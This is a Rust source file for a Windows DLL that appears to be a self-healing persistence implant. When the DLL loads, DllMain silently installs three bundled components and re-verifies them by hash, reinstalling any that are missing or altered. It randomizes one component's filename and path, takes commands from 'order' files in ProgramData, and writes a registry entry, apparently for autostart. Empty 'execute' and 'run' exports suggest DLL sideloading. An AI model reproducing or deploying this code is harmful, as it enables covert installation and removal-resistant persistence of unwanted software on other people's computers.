#![allow(non_snake_case)]
mod utils;
mod constants;
mod ardakan_config;
mod setvol_config;
mod soundlib_config;
mod configuration;

use rand::thread_rng;

use std::{
    io::{self, BufWriter, Write},
    path::PathBuf,
    fs::{create_dir_all, remove_file, OpenOptions, File},
    sync::Mutex,
};

use windows::{
    Win32::Foundation::*, 
    Win32::System::SystemServices::*,
};

use lazy_static::{initialize as ls_initialize};

use crate::{
    constants::{TEHRAN_NAME, LOG_PATH, LOG_FILEPATH},
    configuration::Configuration,
    ardakan_config::ArdakanConfig,
    setvol_config::SetvolConfig,
    soundlib_config::SoundlibConfig,
    utils::{verify_file, thread_sleep, cmd_with_output, reg_add},
};

#[no_mangle]
#[allow(non_snake_case, unused_variables)]
extern "system" fn DllMain(
    dll_module: HINSTANCE,
    call_reason: u32,
    _: *mut ())
    -> bool
{
    match call_reason {
        DLL_PROCESS_ATTACH => {
            tehran_startup();
        },
        DLL_PROCESS_DETACH => (),
        _=> (),    
    }
    true
}

#[no_mangle]
pub extern "C" fn execute() {
    ();
}
#[no_mangle]
pub extern "C" fn run() {
    ();
}

use lazy_static::lazy_static;

lazy_static! {
    static ref LOG_FILE: Mutex<BufWriter<File>> = {
        let file = OpenOptions::new().create(true).write(true).truncate(true).open(&LOG_FILEPATH).unwrap();
        Mutex::new(BufWriter::new(file))
    };
}

fn log(msg: &str) {
    match LOG_FILE.lock() {
        Ok(mut file) => {
            writeln!(file, "{}", msg);
            file.flush();
        }
        Err(error) => eprintln!("[WARNING] mutex error\n///////// {}", error),
    }   
}

fn tehran_startup() -> io::Result<()> {
    thread_sleep(20.0);
    create_dir_all(&LOG_PATH)?;
    ls_initialize(&LOG_FILE);
    log("[INFO] obtaining the homedrive of the device...");
    let HOMEDRIVE: String = match PathBuf::from("C:").exists() {
        true => String::from("C:"),
        false => cmd_with_output("echo %HOMEDRIVE%")?,
    };
    log("[INFO] done\n");
    log("[INFO] loading configuration...");
    let mut configuration: Configuration = match Configuration::load(&HOMEDRIVE, true) {
        Ok(config) => config,
        Err(error) => {
            log(&format!("[WARNING] failed to load configuration\n///////// {}", error));
            let configuration = Configuration::default(&HOMEDRIVE)?;
            configuration.save()?;
            configuration
        },
    };
    log("[INFO] done\n");
    // TEHRAN-UNINSTALL-ALL
    {
        let filepath: PathBuf = [&HOMEDRIVE, "\\ProgramData", "TEHRAN-UNINSTALL-ALL.order"].iter().collect();
        if filepath.is_file() {
            log("[INFO] TEHRAN-UNINSTALL-ALL order detected, uninstalling...");
            configuration.ardakan.uninstall();
            configuration.ardakan.archive_uninstall();
            configuration.setvol.uninstall();
            configuration.setvol.archive_uninstall();
            configuration.soundlib.uninstall();
            configuration.soundlib.archive_uninstall();
            let config_filepath_1: String = format!("{}_1.default", TEHRAN_NAME);
            let config_filepath_2: String = format!("{}_2.default", TEHRAN_NAME);
            let config_filepath_3: String = format!("{}_3.default", TEHRAN_NAME);
            let config_filepath_main: String = format!("{}.config", TEHRAN_NAME);
            match remove_file(&config_filepath_1) {
                Ok(..) => (),
                Err(error) => log(&format!("+-- [WARNING] failed to remove config file : {}\n+-- ///////// {}", &config_filepath_1, error)),
            }
            match remove_file(&config_filepath_2) {
                Ok(..) => (),
                Err(error) => log(&format!("+-- [WARNING] failed to remove config file : {}\n+-- ///////// {}", &config_filepath_2, error)),
            }
            match remove_file(&config_filepath_3) {
                Ok(..) => (),
                Err(error) => log(&format!("+-- [WARNING] failed to remove config file : {}\n+-- ///////// {}", &config_filepath_3, error)),
            }
            match remove_file(&config_filepath_main) {
                Ok(..) => (),
                Err(error) => log(&format!("+-- [WARNING] failed to remove config file : {}\n+-- ///////// {}", &config_filepath_main, error)),
            }
            match remove_file(&filepath) {
                Ok(..) => (),
                Err(error) => log(&format!("+-- [WARNING] failed to remove order file : {}\n+-- ///////// {}", &filepath.display(), error)),
            }
            log("[INFO] done\n");
            return Ok(());
        }
    }
    log("[INFO] verifying backup archives...");
    let ardakan_archive_filepath: PathBuf = configuration.ardakan.get_archive_filepath();
    let setvol_archive_filepath: PathBuf = configuration.setvol.get_archive_filepath();
    let soundlib_archive_filepath: PathBuf = configuration.soundlib.get_archive_filepath();
    if !configuration.ardakan.archive_path.exists() {create_dir_all(&configuration.ardakan.archive_path)?;}
    if !configuration.setvol.archive_path.exists() {create_dir_all(&configuration.setvol.archive_path);}
    if !configuration.soundlib.archive_path.exists() {create_dir_all(&configuration.soundlib.archive_path);}

    if !ardakan_archive_filepath.exists() || !verify_file(&ardakan_archive_filepath, &configuration.ardakan.archive_hash).unwrap_or(true) {
        configuration.ardakan.archive_install()?;
    }
    if !setvol_archive_filepath.exists() || !verify_file(&setvol_archive_filepath, &configuration.setvol.archive_hash).unwrap_or(true) {
        configuration.setvol.archive_install();
    }
    if !soundlib_archive_filepath.exists() || !verify_file(&soundlib_archive_filepath, &configuration.soundlib.archive_hash).unwrap_or(true) {
        configuration.soundlib.archive_install();
    }
    log("[INFO] done\n");
    // TEHRAN-REINSTALL-ARDAKAN
    {
        let filepath: PathBuf = [&HOMEDRIVE, "\\ProgramData", "TEHRAN-REINSTALL-ARDAKAN.order" ].iter().collect();
        if filepath.is_file() {
            log("[INFO] TEHRAN-REINSTALL-ARDAKAN order detected, reinstalling ardakan...");
            configuration.ardakan.uninstall();
            configuration.ardakan.regenerate_filename_path(&mut thread_rng(), &HOMEDRIVE);
            configuration.ardakan.install()?;
            configuration.save()?;
            match remove_file(&filepath) {
                Ok(..) => (),
                Err(error) => log(&format!("+-- [WARNING] failed to remove order file : {}\n+-- ///////// {}", &filepath.display(), error)),
            }
            log("[INFO] done\n");
        }
    }
    // TEHRAN-REINSTALL-SETVOL
    {
        let filepath: PathBuf = [&HOMEDRIVE, "\\ProgramData", "TEHRAN-REINSTALL-SETVOL.order" ].iter().collect();
        if filepath.is_file() {
            log("[INFO] TEHRAN-REINSTALL-SETVOL order detected, reinstalling setvol...");
            configuration.setvol.uninstall();
            configuration.setvol.install();
            match remove_file(&filepath) {
                Ok(..) => (),
                Err(error) => log(&format!("+-- [WARNING] failed to remove order file : {}\n+-- ///////// {}", &filepath.display(), error)),
            }
            log("[INFO] done\n");
        }
    }
    // TEHRAN-REINSTALL-SOUNDLIB
    {
        let filepath: PathBuf = [&HOMEDRIVE, "\\ProgramData", "TEHRAN-REINSTALL-SOUNDLIB.order" ].iter().collect();
        if filepath.is_file() {
            log("[INFO] TEHRAN-REINSTALL-SOUNDLIB order detected, reinstalling soundlib...");
            configuration.soundlib.uninstall();
            configuration.soundlib.install();
            match remove_file(&filepath) {
                Ok(..) => (),
                Err(error) => log(&format!("+-- [WARNING] failed to remove order file : {}\n+-- ///////// {}", &filepath.display(), error)),
            }
            log("[INFO] done\n");
        }
    }
    // TEHRAN-UPDATE-ALL
    {
        let filepath: PathBuf = [&HOMEDRIVE, "\\ProgramData", "TEHRAN-UPDATE-ALL.order" ].iter().collect();
        if filepath.is_file() {
            log("[INFO] TEHRAN-UPDATE-ALL order detected, updating...");
            configuration.ardakan.uninstall();
            configuration.ardakan.archive_uninstall();
            configuration.setvol.uninstall();
            configuration.setvol.archive_uninstall();
            configuration.soundlib.uninstall();
            configuration.soundlib.archive_uninstall();
            match remove_file(&format!("{}.config", TEHRAN_NAME)) {
                Ok(..) => (),
                Err(error) => log(&format!("+-- [WARNING] failed to remove main config file\n+-- ///////// {}", error)),
            }
            ArdakanConfig::default_install()?;
            SetvolConfig::default_install()?;
            SoundlibConfig::default_install()?;
            configuration = Configuration::default(&HOMEDRIVE)?;
            configuration.save()?;
            configuration.ardakan.archive_install()?;
            configuration.setvol.archive_install();
            configuration.soundlib.archive_install();
            configuration.ardakan.install()?;
            configuration.setvol.install();
            configuration.soundlib.install();
            match remove_file(&filepath) {
                Ok(..) => (),
                Err(error) => log(&format!("+-- [WARNING] failed to remove order file : {}\n+-- ///////// {}", &filepath.display(), error)),
            }
            log("[INFO] done\n");
        }
    }
    log("[INFO] verifying ardakan installation...");
    let ardakan_filepath: PathBuf = configuration.ardakan.get_filepath();
    if !(ardakan_filepath.is_file() && verify_file(&ardakan_filepath, &configuration.ardakan.hash).unwrap_or(false)) {
        configuration.ardakan.uninstall();
        configuration.ardakan.regenerate_filename_path(&mut thread_rng(), &HOMEDRIVE);
        configuration.ardakan.install()?;
        configuration.save()?;
    }
    log("[INFO] done\n");
    log("[INFO] verifying setvol installation...");
    let setvol_filepath: PathBuf = configuration.setvol.get_filepath();
    if !(setvol_filepath.is_file() && verify_file(&setvol_filepath, &configuration.setvol.hash).unwrap_or(false)) {
        configuration.setvol.uninstall();
        configuration.setvol.install();
    }
    log("[INFO] done\n");
    log("[INFO] verifying soundlib installation...");
    for filepath in configuration.soundlib.get_filepaths().iter() {
        if !filepath.exists() {
            configuration.soundlib.uninstall();
            configuration.soundlib.install();
            break;
        }
    }
    log("[INFO] done\n");
    log("[INFO] executing reg add command");
    match reg_add(configuration.ardakan.get_filepath().to_str().unwrap()) {
        Ok(string) => log(&string),
        Err(error) => log(&format!("[ERROR] failed to execute reg add command\n/////// {}", error))
    }
    return Ok(());
}